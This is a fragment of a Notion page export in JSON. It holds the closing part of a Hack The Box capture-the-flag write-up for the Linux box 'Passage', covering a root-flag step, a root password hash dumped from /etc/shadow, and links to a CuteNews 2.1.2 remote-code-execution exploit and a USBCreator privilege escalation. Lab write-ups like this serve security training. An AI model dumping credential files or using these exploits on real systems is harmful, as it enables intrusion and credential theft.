root:"]]},{"children":[],"uri":"https://www.notion.so/6a7f3e4d3f204fbaa0f0b24c14f11538","type":"bulleted_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["Get root flag."]]},{"children":[],"uri":"https://www.notion.so/753adb46e71b49a7a626af2ab52f4fc1","type":"heading","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["Persistence"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/0866224e0b7045df9c8e1534d3b5ca54","type":"code","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["root:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/9b8b701033824c75bceb515e5be134c7","type":"bulleted_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["Get root hash from "],["/etc/shadow",[["c",null]]],[" file:"]]},{"children":[],"uri":"https://www.notion.so/a03bbc580b9941e39911f0653106e052","type":"heading","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["Resources"]],"depth":2},{"children":[],"uri":"https://www.notion.so/37c5c11def144752aa6fd3dbe5f14198","type":"numbered_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["https://musyokaian.medium.com/cutenews-2-1-2-remote-code-execution-vulnerability-450f29673194",[["a","https://musyokaian.medium.com/cutenews-2-1-2-remote-code-execution-vulnerability-450f29673194"]]]]},{"children":[],"uri":"https://www.notion.so/8c03a374ae114a62b372362c44db2e82","type":"numbered_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["https://github.com/musyoka101/CuteNews_2.1.2_RCE_exploit/blob/master/exploit.py",[["a","https://github.com/musyoka101/CuteNews_2.1.2_RCE_exploit/blob/master/exploit.py"]]]]},{"children":[],"uri":"https://www.notion.so/7831ce5d01494769bd2c0a932e9475c0","type":"numbered_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/",[["a","https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/"]]]]}],"uri":"https://www.notion.so/35401a222fec4bf1950c52ab34d27e1b","type":"page","createdTime":1616221877694,"lastEditedTime":1616231940000,"title":[["Passage - 10.10.10.206"]],"icon":"https://www.hackthebox.eu/storage/avatars/ec88bbe570fd512ab370208e5139bb41.png","fullWidth":true,"coverPosition":1,"properties":{"!`\"w":[["Yes"]],"'2]%":[["passage"]],"98uZ":[["Medium-difficulty Linux box on exploiting CuteNews 2.1.2 CVE-2019-11447 and abusing Linux's official USB-creator tool to gain arbitrary file write as root."]],":H`m":[["Yes"]],"xY$N":[["‣",[["d",{"type":"datetime","time_zone":"Australia/Adelaide","start_date":"2021-03-13","start_time":"15:21"}]]]],"{iD?":[["Medium,Linux,Web Application,CuteNews,USBCreator"]],"|Ay0":[["post"]],"title":[["Passage - 10.10.10.206"]],"34dcb6ea-0b54-4d5c-97f2-1b547c003948":[["Yes"]],"3fe3e3bf-9500-4abb-8acd-67aba88e6f47":[["https://www.hackthebox.eu/home/machines/profile/275",[["a","https://www.hackthebox.eu/home/machines/profile/275"]]]],"7df966e1-a25b-4512-8e5c-761390b4c971":[["‣",[["d",{"type":"datetimerange","end_date":"2021-01-01","end_time":"23:14","time_zone":"Australia/Adelaide","start_date":"2021-01-01","start_time":"19:51"}]]]],"91d2ba37-40ae-4835-a8e9-f8710a2ecaf6":[["Yes"]],"c8554f2b-cb52-4987-be70-6d00db874c2b":[["Yes"]]}}